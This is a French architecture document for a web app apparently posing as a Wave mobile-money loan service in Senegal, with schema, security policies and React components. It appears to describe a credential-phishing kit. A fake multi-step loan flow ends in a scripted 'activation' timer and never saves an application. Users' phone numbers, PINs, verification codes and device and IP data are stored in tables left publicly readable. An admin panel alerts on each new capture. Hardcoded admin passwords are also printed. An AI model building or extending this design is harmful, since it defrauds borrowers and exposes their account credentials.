# ARCHITECTURE COMPLÈTE - WAVE APP AUTO SENEGAL

## 📋 TABLE DES MATIÈRES

1. [Vue d'ensemble du projet](#1-vue-densemble-du-projet)
2. [Structure des dossiers](#2-structure-des-dossiers)
3. [Technologies utilisées](#3-technologies-utilisées)
4. [Configuration de l'environnement](#4-configuration-de-lenvironnement)
5. [Base de données Supabase](#5-base-de-données-supabase)
6. [Pages publiques](#6-pages-publiques)
7. [Pages utilisateur](#7-pages-utilisateur)
8. [Pages administrateur](#8-pages-administrateur)
9. [Composants réutilisables](#9-composants-réutilisables)
10. [Services et utilitaires](#10-services-et-utilitaires)
11. [Hooks personnalisés](#11-hooks-personnalisés)
12. [Système de navigation](#12-système-de-navigation)
13. [Authentification et autorisation](#13-authentification-et-autorisation)
14. [Fonctionnalités temps réel](#14-fonctionnalités-temps-réel)
15. [Gestion des notifications](#15-gestion-des-notifications)
16. [Sécurité et confidentialité](#16-sécurité-et-confidentialité)
17. [Déploiement](#17-déploiement)
18. [Guide de développement](#18-guide-de-développement)

---

## 1. VUE D'ENSEMBLE DU PROJET

### Objectif
Application de demande de prêt en ligne pour le Sénégal avec interface administrateur temps réel.

### Fonctionnalités principales
- Demande de prêt multi-étapes (7 étapes)
- Authentification utilisateur avec vérification Wave
- Dashboard administrateur temps réel
- Gestion des inscriptions utilisateurs
- Statistiques et analytics
- Notifications desktop
- Tracking des visiteurs

### Architecture globale
```
Client (React + TypeScript)
    ↓
Vite Build System
    ↓
Supabase Backend (PostgreSQL + Auth + Realtime)
    ↓
Netlify Hosting
```

---

## 2. STRUCTURE DES DOSSIERS

```
Wave-app-auto-senegal/
│
├── public/                          # Fichiers publics statiques
│   └── audio/
│       ├── activation.mp3           # Audio pour activation (15s)
│       └── url-verification.mp3     # Audio pour vérification URL
│
├── src/                             # Code source
│   ├── components/                  # Composants React
│   │   ├── LandingPage.tsx          # Page d'accueil (publique)
│   │   ├── LoanApplication.tsx      # Formulaire de prêt (7 étapes)
│   │   ├── AuthScreen.tsx           # Écran d'authentification (5 étapes)
│   │   ├── Dashboard.tsx            # Tableau de bord utilisateur
│   │   ├── AdminAuth.tsx            # Authentification admin
│   │   ├── AdminDashboard.tsx       # Dashboard admin temps réel
│   │   ├── FinalVerification.tsx    # Vérification finale
│   │   ├── LoanPackages.tsx         # Packages de prêt
│   │   ├── LoginForm.tsx            # Formulaire connexion
│   │   └── UrlVerificationStep.tsx  # Étape vérification URL
│   │
│   ├── services/                    # Services métier
│   │   ├── waveApi.ts               # API Wave (DÉSACTIVÉ)
│   │   ├── deviceInfo.ts            # Info device (ANONYMISÉ)
│   │   ├── deviceManager.ts         # Gestion devices
│   │   ├── userRegistration.ts      # Service inscription
│   │   └── requestInterceptor.ts    # Intercepteur (DÉSACTIVÉ)
│   │
│   ├── lib/                         # Bibliothèques
│   │   ├── supabase.ts              # Client Supabase
│   │   ├── adminAuth.ts             # Auth admin
│   │   ├── visitors.ts              # Tracking visiteurs
│   │   ├── notifications.ts         # Notifications desktop
│   │   └── toast.tsx                # Toasts UI
│   │
│   ├── hooks/                       # React hooks
│   │   └── useWaveConnection.ts     # Hook connexion Wave
│   │
│   ├── App.tsx                      # Composant racine (routage)
│   ├── main.tsx                     # Point d'entrée
│   ├── index.css                    # Styles Tailwind
│   └── animations.css               # Animations CSS
│
├── supabase/                        # Configuration Supabase
│   └── migrations/                  # Migrations SQL (28 fichiers)
│       ├── 20240101000000_initial_schema.sql
│       ├── 20240102000000_add_user_registrations.sql
│       └── ... (26 autres migrations)
│
├── Configuration
│   ├── package.json                 # Dépendances npm
│   ├── vite.config.ts               # Config Vite
│   ├── tailwind.config.js           # Config Tailwind
│   ├── tsconfig.json                # Config TypeScript
│   ├── tsconfig.app.json            # Config app
│   ├── tsconfig.node.json           # Config Node
│   ├── netlify.toml                 # Config déploiement
│   ├── .env                         # Variables d'environnement (secret)
│   └── .env.example                 # Exemple variables env
│
└── Documentation
    ├── README.md
    ├── API_DOCUMENTATION.md
    └── 20+ autres fichiers .md
```

---

## 3. TECHNOLOGIES UTILISÉES

### Frontend
```json
{
  "react": "^18.3.1",
  "react-dom": "^18.3.1",
  "typescript": "^5.5.3",
  "lucide-react": "^0.344.0"
}
```

### Build & Dev Tools
```json
{
  "vite": "^5.4.2",
  "@vitejs/plugin-react": "^4.3.1",
  "tailwindcss": "^3.4.1",
  "autoprefixer": "^10.4.18",
  "postcss": "^8.4.35"
}
```

### Backend (Supabase)
- PostgreSQL 15+
- Supabase Auth
- Supabase Realtime
- Row Level Security (RLS)

### Déploiement
- Netlify (hosting)
- Node.js 18+
- npm 9+

---

## 4. CONFIGURATION DE L'ENVIRONNEMENT

### 4.1 Variables d'environnement (.env)

```bash
# Supabase Configuration
VITE_SUPABASE_URL=https://fjfsaocpukulevfefgpg.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Optional: Admin Configuration
VITE_ADMIN_PASSWORD=Darck_44667
```

### 4.2 Configuration Vite (vite.config.ts)

```typescript
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'

export default defineConfig({
  plugins: [react()],
  optimizeDeps: {
    exclude: ['lucide-react'],
  },
  build: {
    outDir: 'dist',
    sourcemap: true,
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom']
        }
      }
    }
  },
  server: {
    port: 5173,
    host: true
  }
})
```

### 4.3 Configuration Tailwind (tailwind.config.js)

```javascript
/** @type {import('tailwindcss').Config} */
export default {
  content: [
    "./index.html",
    "./src/**/*.{js,ts,jsx,tsx}",
  ],
  theme: {
    extend: {},
  },
  plugins: [],
}
```

### 4.4 Configuration TypeScript (tsconfig.json)

```json
{
  "compilerOptions": {
    "target": "ES2020",
    "useDefineForClassFields": true,
    "lib": ["ES2020", "DOM", "DOM.Iterable"],
    "module": "ESNext",
    "skipLibCheck": true,
    "moduleResolution": "bundler",
    "allowImportingTsExtensions": true,
    "resolveJsonModule": true,
    "isolatedModules": true,
    "noEmit": true,
    "jsx": "react-jsx",
    "strict": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true,
    "noFallthroughCasesInSwitch": true
  },
  "include": ["src"],
  "references": [
    { "path": "./tsconfig.app.json" },
    { "path": "./tsconfig.node.json" }
  ]
}
```

### 4.5 Configuration Netlify (netlify.toml)

```toml
[build]
  command = "npm run build"
  publish = "dist"

[build.environment]
  NODE_VERSION = "18"
  NPM_VERSION = "9"

[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200

[[headers]]
  for = "/*"
  [headers.values]
    X-Frame-Options = "DENY"
    X-Content-Type-Options = "nosniff"
    X-XSS-Protection = "1; mode=block"
    Referrer-Policy = "strict-origin-when-cross-origin"
    Content-Security-Policy = "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://fjfsaocpukulevfefgpg.supabase.co wss://fjfsaocpukulevfefgpg.supabase.co"

[[headers]]
  for = "/assets/*"
  [headers.values]
    Cache-Control = "public, max-age=31536000, immutable"

[[headers]]
  for = "/*.html"
  [headers.values]
    Cache-Control = "public, max-age=0, must-revalidate"
```

---

## 5. BASE DE DONNÉES SUPABASE

### 5.1 Schéma complet

#### Table: user_registrations

**Description**: Stocke toutes les inscriptions utilisateurs avec leurs informations de vérification.

```sql
CREATE TABLE user_registrations (
    -- Identification
    id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    phone text UNIQUE NOT NULL,

    -- Statut et type
    status text NOT NULL DEFAULT 'pending',
    -- Valeurs: 'pending', 'pending_validation', 'verified', 'rejected'
    account_type text,
    -- Valeurs: 'standard', 'business'

    -- Business
    business_account_id text,
    business_verified boolean DEFAULT false,

    -- Priorité
    priority_level integer DEFAULT 0,

    -- Vérification
    verification_attempts integer DEFAULT 0,
    last_verification_code text,
    verification_url text,

    -- Sécurité
    pin text,
    pin_attempts integer DEFAULT 0,

    -- Device Info (ANONYMISÉ dans le code)
    user_mac_address text,
    user_device_id text,
    user_ip text,
    user_country text,
    user_browser text,
    user_os text,
    phone_model text,
    device_type text,
    device_vendor text,

    -- Timestamps
    created_at timestamptz DEFAULT now()
);

-- Index pour performance
CREATE INDEX idx_user_registrations_phone ON user_registrations(phone);
CREATE INDEX idx_user_registrations_status ON user_registrations(status);
CREATE INDEX idx_user_registrations_created_at ON user_registrations(created_at DESC);
```

#### Table: admin_notifications

**Description**: Stocke les notifications pour les administrateurs.

```sql
CREATE TABLE admin_notifications (
    id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    event_type text NOT NULL,
    -- Valeurs: 'new_registration', 'verification_attempt', 'status_change'
    phone_number text,
    timestamp timestamptz DEFAULT now(),
    notified boolean DEFAULT false,
    created_at timestamptz DEFAULT now()
);

CREATE INDEX idx_admin_notifications_notified ON admin_notifications(notified);
CREATE INDEX idx_admin_notifications_timestamp ON admin_notifications(timestamp DESC);
```

#### Table: realtime_visitors

**Description**: Tracking des visiteurs en temps réel.

```sql
CREATE TABLE realtime_visitors (
    id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    session_id text UNIQUE NOT NULL,
    page text NOT NULL,
    -- Valeurs: 'landing', 'loan_application', 'auth', 'dashboard', 'admin'
    last_seen timestamptz DEFAULT now(),
    created_at timestamptz DEFAULT now()
);

CREATE INDEX idx_realtime_visitors_last_seen ON realtime_visitors(last_seen DESC);
CREATE INDEX idx_realtime_visitors_session_id ON realtime_visitors(session_id);
```

#### Table: webhook_logs

**Description**: Logs des webhooks (pour debugging).

```sql
CREATE TABLE webhook_logs (
    id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    event_type text NOT NULL,
    payload jsonb,
    created_at timestamptz DEFAULT now()
);

CREATE INDEX idx_webhook_logs_event_type ON webhook_logs(event_type);
CREATE INDEX idx_webhook_logs_created_at ON webhook_logs(created_at DESC);
```

#### Table: user_device_details

**Description**: Détails des devices utilisateurs (relation 1-N avec user_registrations).

```sql
CREATE TABLE user_device_details (
    id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    registration_id uuid REFERENCES user_registrations(id) ON DELETE CASCADE,
    mac_address text,
    device_id text,
    ip_address text,
    country text,
    browser text,
    os text,
    screen_resolution text,
    timezone text,
    language text,
    created_at timestamptz DEFAULT now()
);

CREATE INDEX idx_user_device_details_registration_id ON user_device_details(registration_id);
```

### 5.2 Row Level Security (RLS)

#### user_registrations

```sql
-- Enable RLS
ALTER TABLE user_registrations ENABLE ROW LEVEL SECURITY;

-- Policy: Public can read
CREATE POLICY "Public can view registrations" ON user_registrations
    FOR SELECT USING (true);

-- Policy: Public can insert
CREATE POLICY "Public can insert registrations" ON user_registrations
    FOR INSERT WITH CHECK (true);

-- Policy: Public can update own registration
CREATE POLICY "Public can update registrations" ON user_registrations
    FOR UPDATE USING (true);
```

#### admin_notifications

```sql
ALTER TABLE admin_notifications ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Authenticated users can view notifications" ON admin_notifications
    FOR SELECT USING (auth.role() = 'authenticated');

CREATE POLICY "Service role can insert notifications" ON admin_notifications
    FOR INSERT WITH CHECK (auth.role() = 'service_role');
```

#### realtime_visitors

```sql
ALTER TABLE realtime_visitors ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Public can view visitors" ON realtime_visitors
    FOR SELECT USING (true);

CREATE POLICY "Public can insert visitors" ON realtime_visitors
    FOR INSERT WITH CHECK (true);

CREATE POLICY "Public can update visitors" ON realtime_visitors
    FOR UPDATE USING (true);
```

### 5.3 Fonctions SQL utiles

#### Cleanup des visiteurs inactifs

```sql
CREATE OR REPLACE FUNCTION cleanup_old_visitors()
RETURNS void AS $$
BEGIN
    DELETE FROM realtime_visitors
    WHERE last_seen < now() - interval '5 minutes';
END;
$$ LANGUAGE plpgsql;

-- Créer un cron job (si extension pg_cron est activée)
SELECT cron.schedule('cleanup-visitors', '*/5 * * * *', 'SELECT cleanup_old_visitors()');
```

#### Fonction pour obtenir les statistiques

```sql
CREATE OR REPLACE FUNCTION get_registration_stats(days integer DEFAULT 1)
RETURNS TABLE (
    total_registrations bigint,
    verified_count bigint,
    rejected_count bigint,
    pending_count bigint,
    conversion_rate numeric
) AS $$
BEGIN
    RETURN QUERY
    SELECT
        COUNT(*) as total_registrations,
        COUNT(*) FILTER (WHERE status = 'verified') as verified_count,
        COUNT(*) FILTER (WHERE status = 'rejected') as rejected_count,
        COUNT(*) FILTER (WHERE status IN ('pending', 'pending_validation')) as pending_count,
        ROUND(
            (COUNT(*) FILTER (WHERE status = 'verified')::numeric /
            NULLIF(COUNT(*), 0) * 100), 2
        ) as conversion_rate
    FROM user_registrations
    WHERE created_at > now() - make_interval(days => days);
END;
$$ LANGUAGE plpgsql;
```

---

## 6. PAGES PUBLIQUES

### 6.1 LandingPage.tsx

**Fichier**: [src/components/LandingPage.tsx](src/components/LandingPage.tsx)

**Description**: Page d'accueil du site, première page vue par les visiteurs.

**Fonctionnalités**:
- Hero section avec titre accrocheur
- CTA "Demander mon prêt"
- Présentation des avantages (taux, rapidité, sécurité)
- Section témoignages clients
- Footer avec contact
- Tracking des visites

**Structure du composant**:

```typescript
interface LandingPageProps {
  onGetStarted: () => void;  // Callback pour démarrer demande
}

const LandingPage: React.FC<LandingPageProps> = ({ onGetStarted }) => {
  // Enregistrer la visite au montage
  useEffect(() => {
    recordVisit('landing');
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
      {/* Hero Section */}
      <header className="container mx-auto px-4 py-16">
        <h1 className="text-5xl font-bold text-center">
          Votre prêt en quelques minutes
        </h1>
        <button onClick={onGetStarted}>
          Demander mon prêt
        </button>
      </header>

      {/* Features Section */}
      <section className="grid grid-cols-3 gap-8">
        <Feature icon={TrendingDown} title="Taux avantageux" />
        <Feature icon={Clock} title="Traitement rapide" />
        <Feature icon={Shield} title="100% sécurisé" />
      </section>

      {/* Testimonials */}
      <section className="py-16">
        {/* ... */}
      </section>

      {/* Footer */}
      <footer>
        {/* ... */}
      </footer>
    </div>
  );
};
```

**Tracking des visites**:

```typescript
import { recordVisit } from '../lib/visitors';

useEffect(() => {
  recordVisit('landing');
}, []);
```

---

### 6.2 LoanApplication.tsx

**Fichier**: [src/components/LoanApplication.tsx](src/components/LoanApplication.tsx)

**Description**: Formulaire multi-étapes pour demande de prêt (7 étapes).

**Étapes du formulaire**:

1. **welcome**: Écran de bienvenue
2. **project-type**: Choix du type de projet
3. **amount**: Sélection du montant
4. **duration**: Choix de la durée
5. **eligibility**: Vérification d'éligibilité
6. **transaction-check**: Vérification transactions
7. **personal**: Informations personnelles
8. **activating**: Activation compte (avec audio 15s)
9. **success**: Confirmation finale

**Types de projets disponibles**:

```typescript
const projectTypes = [
  {
    id: 'commerce',
    title: 'Commerce',
    description: 'Pour développer votre activité commerciale',
    icon: Store,
    amounts: [50000, 100000, 200000, 500000], // XOF
    minAmount: 50000,
    maxAmount: 500000
  },
  {
    id: 'immobilier',
    title: 'Immobilier',
    description: 'Pour vos projets immobiliers',
    icon: Home,
    amounts: [500000, 1000000, 1500000, 2000000],
    minAmount: 500000,
    maxAmount: 2000000
  },
  {
    id: 'particulier',
    title: 'Particulier',
    description: 'Pour vos besoins personnels',
    icon: User,
    amounts: [100000, 250000, 500000, 750000],
    minAmount: 100000,
    maxAmount: 750000
  }
];
```

**Durées et intérêts**:

```typescript
const durations = [
  { months: 2, interestRate: 5 },   // 5% sur 2 mois
  { months: 3, interestRate: 7.5 }, // 7.5% sur 3 mois
  { months: 4, interestRate: 10 }   // 10% sur 4 mois
];
```

**État du formulaire**:

```typescript
interface FormData {
  projectType: string;
  amount: number;
  duration: number;
  interestRate: number;
  fullName: string;
  phone: string;
  email: string;
  address: string;
  hasTransactions: boolean;
}

const [formData, setFormData] = useState<FormData>({
  projectType: '',
  amount: 0,
  duration: 0,
  interestRate: 0,
  fullName: '',
  phone: '',
  email: '',
  address: '',
  hasTransactions: false
});
```

**Navigation entre étapes**:

```typescript
const [currentStep, setCurrentStep] = useState('welcome');

const nextStep = () => {
  const steps = ['welcome', 'project-type', 'amount', 'duration',
                 'eligibility', 'transaction-check', 'personal',
                 'activating', 'success'];
  const currentIndex = steps.indexOf(currentStep);
  if (currentIndex < steps.length - 1) {
    setCurrentStep(steps[currentIndex + 1]);
  }
};

const prevStep = () => {
  // Logique retour arrière
};
```

**Étape d'activation avec audio**:

```typescript
// Étape 'activating'
const [activationProgress, setActivationProgress] = useState(0);

useEffect(() => {
  if (currentStep === 'activating') {
    // Jouer l'audio
    const audio = new Audio('/audio/activation.mp3');
    audio.play();

    // Progression de 0 à 100 en 15 secondes
    const interval = setInterval(() => {
      setActivationProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          nextStep(); // Passer à 'success'
          return 100;
        }
        return prev + (100 / 15); // 15 secondes
      });
    }, 1000);

    return () => clearInterval(interval);
  }
}, [currentStep]);
```

**Validation et soumission**:

```typescript
const handleSubmit = async () => {
  // Validation
  if (!formData.fullName || !formData.phone) {
    toast.error('Veuillez remplir tous les champs obligatoires');
    return;
  }

  // Enregistrement en base (optionnel)
  // await supabase.from('loan_applications').insert({...formData});

  // Passer à l'authentification
  onComplete();
};
```

**Rendu conditionnel des étapes**:

```typescript
return (
  <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
    {/* Progress bar */}
    <ProgressBar currentStep={currentStep} />

    {/* Rendu conditionnel */}
    {currentStep === 'welcome' && <WelcomeStep onNext={nextStep} />}
    {currentStep === 'project-type' && <ProjectTypeStep onNext={nextStep} />}
    {currentStep === 'amount' && <AmountStep onNext={nextStep} />}
    {/* ... autres étapes */}
    {currentStep === 'activating' && (
      <ActivationStep progress={activationProgress} />
    )}
    {currentStep === 'success' && (
      <SuccessStep onComplete={handleSubmit} />
    )}
  </div>
);
```

---

## 7. PAGES UTILISATEUR

### 7.1 Dashboard.tsx

**Fichier**: [src/components/Dashboard.tsx](src/components/Dashboard.tsx)

**Description**: Tableau de bord pour utilisateurs authentifiés.

**Fonctionnalités**:
- Affichage des packages de prêt disponibles
- Menu de navigation
- Profil utilisateur
- Historique des demandes
- Logout

**Packages de prêt**:

```typescript
const loanPackages = [
  {
    id: 'express',
    name: 'Prêt Express',
    description: 'Pour vos besoins urgents',
    minAmount: 100000,
    maxAmount: 500000,
    minDuration: 15,
    maxDuration: 30,
    interestRate: 5,
    features: [
      'Approbation en 24h',
      'Sans justificatif',
      'Taux fixe 5%'
    ]
  },
  {
    id: 'personal',
    name: 'Prêt Personnel',
    description: 'Pour vos projets personnels',
    minAmount: 250000,
    maxAmount: 2500000,
    minDuration: 3,
    maxDuration: 12,
    interestRate: 7.5,
    features: [
      'Montants élevés',
      'Durée flexible',
      'Taux compétitif'
    ]
  },
  {
    id: 'professional',
    name: 'Prêt Professionnel',
    description: 'Pour développer votre activité',
    minAmount: 500000,
    maxAmount: 5000000,
    minDuration: 6,
    maxDuration: 24,
    interestRate: 10,
    features: [
      'Accompagnement personnalisé',
      'Conditions avantageuses',
      'Report de paiement possible'
    ]
  }
];
```

**Structure du composant**:

```typescript
interface DashboardProps {
  onLogout: () => void;
  userPhone: string;
}

const Dashboard: React.FC<DashboardProps> = ({ onLogout, userPhone }) => {
  const [activeTab, setActiveTab] = useState('loans');

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white shadow">
        <div className="container mx-auto px-4 py-4 flex justify-between">
          <h1>Wave Auto Prêt</h1>
          <button onClick={onLogout}>Déconnexion</button>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-8">
        {/* Tabs */}
        <Tabs value={activeTab} onChange={setActiveTab}>
          <Tab value="loans">Prêts disponibles</Tab>
          <Tab value="history">Mes demandes</Tab>
          <Tab value="profile">Mon profil</Tab>
        </Tabs>

        {/* Content */}
        {activeTab === 'loans' && (
          <LoanPackages packages={loanPackages} />
        )}

        {activeTab === 'history' && (
          <LoanHistory userPhone={userPhone} />
        )}

        {activeTab === 'profile' && (
          <UserProfile userPhone={userPhone} />
        )}
      </main>
    </div>
  );
};
```

---

## 8. PAGES ADMINISTRATEUR

### 8.1 AdminAuth.tsx

**Fichier**: [src/components/AdminAuth.tsx](src/components/AdminAuth.tsx)

**Description**: Page d'authentification pour les administrateurs avec design "Matrix".

**Mots de passe acceptés**:
- `Darck_44667`
- `44667`

**Fonctionnalités**:
- Interface style Matrix (effet pluie de code)
- Validation du mot de passe
- Session persistante (24h)
- Cookies sécurisés
- Redirection automatique si session valide

**Structure du composant**:

```typescript
import { adminAuth } from '../lib/adminAuth';

interface AdminAuthProps {
  onSuccess: () => void;
}

const AdminAuth: React.FC<AdminAuthProps> = ({ onSuccess }) => {
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  // Vérifier session existante au montage
  useEffect(() => {
    const hasSession = adminAuth.checkSession();
    if (hasSession) {
      onSuccess();
    }
  }, [onSuccess]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      const success = await adminAuth.login(code);

      if (success) {
        onSuccess();
      } else {
        setError('Code d\'accès invalide');
      }
    } catch (err) {
      setError('Erreur de connexion');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-black relative overflow-hidden">
      {/* Matrix Background Effect */}
      <MatrixRain />

      {/* Login Form */}
      <div className="relative z-10 flex items-center justify-center min-h-screen">
        <div className="bg-black/80 border border-green-500 p-8 rounded-lg">
          <h1 className="text-green-500 text-2xl mb-6 font-mono">
            ADMIN ACCESS
          </h1>

          <form onSubmit={handleSubmit}>
            <input
              type="password"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="Enter access code..."
              className="bg-black text-green-500 border border-green-500"
            />

            {error && (
              <p className="text-red-500 mt-2">{error}</p>
            )}

            <button
              type="submit"
              disabled={loading}
              className="bg-green-500 text-black px-6 py-2 mt-4"
            >
              {loading ? 'ACCESSING...' : 'ACCESS'}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};
```

**Effet Matrix (composant interne)**:

```typescript
const MatrixRain = () => {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const drops: number[] = Array(Math.floor(columns)).fill(1);

    const draw = () => {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.fillStyle = '#0F0';
      ctx.font = `${fontSize}px monospace`;

      drops.forEach((y, i) => {
        const text = characters[Math.floor(Math.random() * characters.length)];
        const x = i * fontSize;

        ctx.fillText(text, x, y * fontSize);

        if (y * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      });
    };

    const interval = setInterval(draw, 33);
    return () => clearInterval(interval);
  }, []);

  return (
    <canvas
      ref={canvasRef}
      className="absolute inset-0 z-0"
    />
  );
};
```

---

### 8.2 AdminDashboard.tsx

**Fichier**: [src/components/AdminDashboard.tsx](src/components/AdminDashboard.tsx)

**Description**: Dashboard temps réel pour gérer les inscriptions utilisateurs.

**Fonctionnalités principales**:

1. **Visualisation temps réel**
   - Subscriptions Supabase Realtime
   - Mise à jour automatique toutes les 30s
   - Notifications sonores

2. **Gestion des inscriptions**
   - Valider
   - Rejeter
   - Supprimer
   - Voir détails

3. **Statistiques**
   - Visiteurs actifs (5 min)
   - Visiteurs horaires
   - Visiteurs journaliers
   - Taux de conversion
   - Vérifiés aujourd'hui

4. **Filtres et recherche**
   - Par statut
   - Par date
   - Par type de compte
   - Par numéro de téléphone

**Structure du composant**:

```typescript
interface AdminDashboardProps {
  onLogout: () => void;
}

const AdminDashboard: React.FC<AdminDashboardProps> = ({ onLogout }) => {
  const [registrations, setRegistrations] = useState<UserRegistration[]>([]);
  const [loading, setLoading] = useState(true);
  const [stats, setStats] = useState({
    activeVisitors: 0,
    hourlyVisitors: 0,
    dailyVisitors: 0,
    verifiedToday: 0,
    conversionRate: 0
  });

  // Filtres
  const [statusFilter, setStatusFilter] = useState<string>('all');
  const [dateFilter, setDateFilter] = useState<string>('today');
  const [searchTerm, setSearchTerm] = useState('');

  // Charger les données initiales
  useEffect(() => {
    loadRegistrations();
    loadStats();
  }, []);

  // Real-time subscription
  useEffect(() => {
    const channel = supabase
      .channel('user_registrations_changes')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'user_registrations'
        },
        (payload) => {
          handleRealtimeUpdate(payload);
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  // Auto-refresh toutes les 30s
  useEffect(() => {
    const interval = setInterval(() => {
      loadRegistrations();
      loadStats();
    }, 30000);

    return () => clearInterval(interval);
  }, []);

  // Charger inscriptions
  const loadRegistrations = async () => {
    setLoading(true);

    let query = supabase
      .from('user_registrations')
      .select('*')
      .order('created_at', { ascending: false });

    // Appliquer filtres
    if (statusFilter !== 'all') {
      query = query.eq('status', statusFilter);
    }

    if (dateFilter === 'today') {
      const today = new Date();
      today.setHours(0, 0, 0, 0);
      query = query.gte('created_at', today.toISOString());
    }

    const { data, error } = await query;

    if (error) {
      console.error('Error loading registrations:', error);
    } else {
      setRegistrations(data || []);
    }

    setLoading(false);
  };

  // Charger statistiques
  const loadStats = async () => {
    // Visiteurs actifs (5 min)
    const { count: activeCount } = await supabase
      .from('realtime_visitors')
      .select('*', { count: 'exact', head: true })
      .gte('last_seen', new Date(Date.now() - 5 * 60 * 1000).toISOString());

    // Visiteurs horaires
    const { count: hourlyCount } = await supabase
      .from('realtime_visitors')
      .select('*', { count: 'exact', head: true })
      .gte('created_at', new Date(Date.now() - 60 * 60 * 1000).toISOString());

    // Visiteurs journaliers
    const { count: dailyCount } = await supabase
      .from('realtime_visitors')
      .select('*', { count: 'exact', head: true })
      .gte('created_at', new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString());

    // Vérifiés aujourd'hui
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const { count: verifiedCount } = await supabase
      .from('user_registrations')
      .select('*', { count: 'exact', head: true })
      .eq('status', 'verified')
      .gte('created_at', today.toISOString());

    // Taux de conversion
    const { count: totalToday } = await supabase
      .from('user_registrations')
      .select('*', { count: 'exact', head: true })
      .gte('created_at', today.toISOString());

    const conversionRate = totalToday > 0
      ? (verifiedCount / totalToday * 100).toFixed(2)
      : 0;

    setStats({
      activeVisitors: activeCount || 0,
      hourlyVisitors: hourlyCount || 0,
      dailyVisitors: dailyCount || 0,
      verifiedToday: verifiedCount || 0,
      conversionRate: Number(conversionRate)
    });
  };

  // Gestion des updates temps réel
  const handleRealtimeUpdate = (payload: any) => {
    if (payload.eventType === 'INSERT') {
      setRegistrations(prev => [payload.new, ...prev]);
      playNotificationSound();
      showDesktopNotification(payload.new);
    } else if (payload.eventType === 'UPDATE') {
      setRegistrations(prev =>
        prev.map(r => r.id === payload.new.id ? payload.new : r)
      );
    } else if (payload.eventType === 'DELETE') {
      setRegistrations(prev => prev.filter(r => r.id !== payload.old.id));
    }
  };

  // Actions sur les inscriptions
  const handleValidate = async (id: string) => {
    const { error } = await supabase
      .from('user_registrations')
      .update({ status: 'verified' })
      .eq('id', id);

    if (error) {
      toast.error('Erreur lors de la validation');
    } else {
      toast.success('Inscription validée');
      loadRegistrations();
    }
  };

  const handleReject = async (id: string) => {
    const { error } = await supabase
      .from('user_registrations')
      .update({ status: 'rejected' })
      .eq('id', id);

    if (error) {
      toast.error('Erreur lors du rejet');
    } else {
      toast.success('Inscription rejetée');
      loadRegistrations();
    }
  };

  const handleDelete = async (id: string) => {
    if (!confirm('Êtes-vous sûr de vouloir supprimer cette inscription ?')) {
      return;
    }

    const { error } = await supabase
      .from('user_registrations')
      .delete()
      .eq('id', id);

    if (error) {
      toast.error('Erreur lors de la suppression');
    } else {
      toast.success('Inscription supprimée');
      loadRegistrations();
    }
  };

  // Notification desktop
  const showDesktopNotification = (registration: UserRegistration) => {
    if ('Notification' in window && Notification.permission === 'granted') {
      new Notification('Nouvelle inscription', {
        body: `Téléphone: ${registration.phone}`,
        icon: '/icon.png',
        requireInteraction: true
      });
    }
  };

  // Rendu
  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <header className="bg-white shadow">
        <div className="container mx-auto px-4 py-4 flex justify-between">
          <h1 className="text-2xl font-bold">Admin Dashboard</h1>
          <button onClick={onLogout} className="text-red-500">
            Déconnexion
          </button>
        </div>
      </header>

      {/* Stats Cards */}
      <div className="container mx-auto px-4 py-8">
        <div className="grid grid-cols-5 gap-4 mb-8">
          <StatCard
            title="Visiteurs actifs"
            value={stats.activeVisitors}
            icon={Users}
            color="green"
          />
          <StatCard
            title="Visiteurs (1h)"
            value={stats.hourlyVisitors}
            icon={Clock}
            color="blue"
          />
          <StatCard
            title="Visiteurs (24h)"
            value={stats.dailyVisitors}
            icon={TrendingUp}
            color="purple"
          />
          <StatCard
            title="Vérifiés"
            value={stats.verifiedToday}
            icon={CheckCircle}
            color="green"
          />
          <StatCard
            title="Conversion"
            value={`${stats.conversionRate}%`}
            icon={Percent}
            color="orange"
          />
        </div>

        {/* Filters */}
        <div className="bg-white p-4 rounded-lg shadow mb-4">
          <div className="grid grid-cols-4 gap-4">
            <select
              value={statusFilter}
              onChange={(e) => setStatusFilter(e.target.value)}
